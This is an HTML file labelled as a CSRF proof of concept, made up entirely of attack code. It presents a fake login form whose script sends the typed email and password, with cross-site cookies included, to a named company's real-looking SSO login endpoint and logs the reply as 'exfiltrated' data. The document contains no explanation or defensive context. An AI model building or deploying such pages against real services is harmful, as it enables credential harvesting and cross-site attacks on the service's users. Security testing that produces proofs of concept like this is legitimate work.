<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC - Login Form</title>
</head>
<body>
    <h3>Simulated Login Form</h3>
    <form id="loginForm">
        <label>Email:</label><br>
        <input type="email" id="email" name="email" required><br><br>
        <label>Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            // Collect credentials from the form
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Prepare data to send in POST request
            const payload = JSON.stringify({ email: email, password: password });

            // Send POST request in the background
            try {
                const response = await fetch('https://sso.saytechnologies.com/v1/auth/login/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: payload,
                    credentials: 'include'
                });

                // Extract response data
                if (response.ok) {
                    const data = await response.json();
                    console.log("Exfiltrated Response Data:", data);
                } else {
                    console.log("Request failed with status:", response.status);
                }
            } catch (error) {
                console.error("Error:", error);
            }
        });
    </script>
</body>
</html>
